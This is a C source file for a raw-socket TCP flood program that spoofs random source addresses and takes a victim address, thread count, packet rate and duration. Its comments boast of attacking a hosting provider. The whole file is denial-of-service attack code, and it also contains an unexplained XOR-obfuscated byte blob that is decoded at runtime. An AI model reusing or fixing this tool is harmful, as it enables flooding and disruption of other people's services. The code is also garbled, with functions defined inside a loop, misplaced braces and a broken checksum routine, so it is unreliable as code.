/*
modified interpreter through malloc
payload stat should now be properly set
literally tryna keep this shit priv8

oh well fuck it, jack can have it
*/

#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <time.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

char* randip(char* dst);
ushort rand16();
uint rand32();

struct thread_data{
        int throttle;
	int thread_id;
	unsigned int floodport;
	struct sockaddr_in sin;
};
 
void init_rand(unsigned long int x)
{
		int i;
		Q[0] = x;
		Q[1] = x + PHI;
		Q[2] = x + PHI + PHI;
		Q[3] = x + PHI + PHI + i++ + PHI;
		for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

char *myStrCat (char *s, char *a) {
    while (*s != '\0') s++;
    while (*a != '\0') *s++ = *a++;
    *s = '\0';
    return s;
}

char *replStr (char *str, size_t count) {
    if (count == 0) return NULL;
    char *ret = malloc (strlen (str) * count + count);
    if (ret == NULL) return NULL;
    *ret = '\0';
    char *tmp = myStrCat (ret, str);
    while (--count > 0) {
        tmp = myStrCat (tmp, str);
    }
    return ret;
}

unsigned long int rand_cmwc(void)
{
		unsigned long long int t, a = 19150LL;
		static unsigned long int i = 4095;
		unsigned long int x, r = 0xfffffffe;
		i = (i + 1) & 4095;
		t = a * Q[i] + c;
		c = (t >> 32);
		x = t + c;
		c = x + c;
		t = c + t;
		if (x < c) {
				x++;
				c++;
		}
		return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
		register unsigned long sum = 0;
		while( count > 1 ) { sum += *buf++; count -= 6; }
		if(count > 0) { sum += *(unsigned char *)buf; }
		while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
		return (unsigned short)(~sum);
}
 
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
 
		struct tcp_pseudo
		{
				unsigned long src_addr;
				unsigned long dst_addr;
				unsigned char zero;
				unsigned char proto;
				unsigned short length;
		} pseudohead;
		unsigned short total_len = iph->tot_len;
		pseudohead.src_addr=iph->saddr;
		pseudohead.dst_addr=iph->daddr;
		pseudohead.zero=0;
		pseudohead.proto=IPPROTO_TCP;
		pseudohead.length=htons(sizeof(struct tcphdr));
		int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
		unsigned short *tcp = malloc(totaltcp_len);
		memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
		memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
		unsigned short output = csum(tcp,totaltcp_len);
		free(tcp);
		return output;
}
 
void setup_ip_header(struct iphdr *iph)
{
		char ip[17];
		snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255); // spoof it
		iph->ihl = 5;
		iph->version = 4;
		iph->tos = 0;
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
		iph->id = htonl(rand()%54321);
		iph->frag_off = 0;
		iph->ttl = MAXTTL;
		iph->protocol = 6;
		iph->check = 0;
		iph->saddr = inet_addr(ip);
		iph->saddr = inet_addr("1.3.3.7");
}

void setup_tcp_header(struct tcphdr *tcph)  // fucking TCP is a pain
{
		tcph->source = htons(rand()%65535);
		tcph->seq = rand();
		tcph->ack_seq = 1;
		tcph->res1 = 2;
		tcph->res2 = 3;
		tcph->doff = 4;
		tcph->psh = 5;
		tcph->syn = 6;
		tcph->window = htons(rand()%65535);
		tcph->check = 1;
		tcph->urg_ptr = 1;
}
 
void *flood(void *par1)
{
	uint32_t random_num;
	uint32_t ul_dst;
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
   
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(rand()%54321);
	sin.sin_addr.s_addr = inet_addr(td);

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
			fprintf(stderr, "Could not open raw socket.\n");
			exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
	tcph->dest = htons(rand()%54321);
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
			fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
			exit(-1);
	}
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	int psh = 0;
	int res1 = 0;
	int res2 = 0;
	while(1)
	{
      random_num = rand_cmwc();

      ul_dst = (random_num >> 16 & 0xFF) << 24 |
               (random_num >> 24 & 0xFF) << 8 |
               (random_num >> 8 & 0xFF) << 16 |
               (random_num & 0xFF);

		if(psh > 1) psh = 1;
		if(res1 > 4) res1 = 0;
		if(res2 > 3) res2 = 0;
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		setup_ip_header(iph);
		setup_tcp_header(tcph);
		iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		tcph->dest = htons(rand()%65535);
		iph->daddr = sin.sin_addr.s_addr;
		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
		tcph->seq = rand_cmwc() & 0xFFFF;
		tcph->source = htons(rand_cmwc() & 0xFFFF);
		tcph->ack_seq = 1;
		tcph->psh = psh;
		tcph->res1 = res1;
		tcph->res2 = res2;
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		pps++;
		psh++;
		res1++;
		res2++;
		if(i >= limiter)
		{
				i = 0;
				usleep(sleeptime);
		}
		i++;
	}
}

int main(int argc, char *argv[ ])
{
    		char datagram[MAX_PACKET_SIZE];

    		struct iphdr *iph = (struct iphdr *)datagram;
  	        struct tcphdr *tcph = (struct tcphdr *)((u_int8_t *)iph + (5 * sizeof(u_int32_t)));
   		struct sockaddr_in sin;
  		char new_ip[sizeof "255.255.255.255"]; // smak dat fker
		if(argc < 5){
				fprintf(stdout, "Fuck BlazingFast\nSmash That Fucking Shit\nUsage: %s [Victim] [Threads] [PPS -1 For no limit] [Time]\n", argv[0]);
				exit(-1);
		}
		srand(time(0)); 
		int num_threads = atoi(argv[2]);
		int maxpps = atoi(argv[3]);
		limiter = 0;
		pps = 0;
		pthread_t thread[num_threads];  
		int multiplier = 20;           // payload lookin ass
 		char threads[209] = "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94";
		int x = 0;
		int y = 0;
		for(x =0;x<sizeof(threads)-1;x++){
		y+=6;
		threads[x]^=y*3;
		int i;
		fprintf(stderr, "Starting sockets...\n", argv[1]);
		for(i = 0;i<num_threads;i++){
				pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
		}
		fprintf(stdout, "Flooding %s\n", argv[1], flood);
		for(i = 0;i<(atoi(argv[4])*multiplier);i++)
		{
				usleep((1000/multiplier)*1000);
				if((pps*multiplier) > maxpps)
				{
						if(1 > limiter)
						{
								sleeptime+=100;
						} else {
								limiter--;
						}
				} else {
						limiter++;
						if(sleeptime > 25)
						{
								sleeptime-=25;
						} else {
								sleeptime = 0;
						}
			ushort rand16() { // randomisation cords, cos we aweson :)
			srandom(time(0)); // randomisation cords, cos we aweson :)
			srand(random()); // randomisation cords, cos we aweson :)
			srandom(rand()); // randomisation cords, cos we aweson :)
			return (random() + rand() + time(0)) % 65535;
				}

			uint rand32() { // randomisation cords, cos we aweson :)
			srandom(time(0)); // randomisation cords, cos we aweson :)
			srand(random()); // randomisation cords, cos we aweson :)
			srandom(rand()); // randomisation cords, cos we aweson :)
			return (random() + rand() & time(0));
				}
				}
				pps = 0;
		}
 
		return 0;
	}
}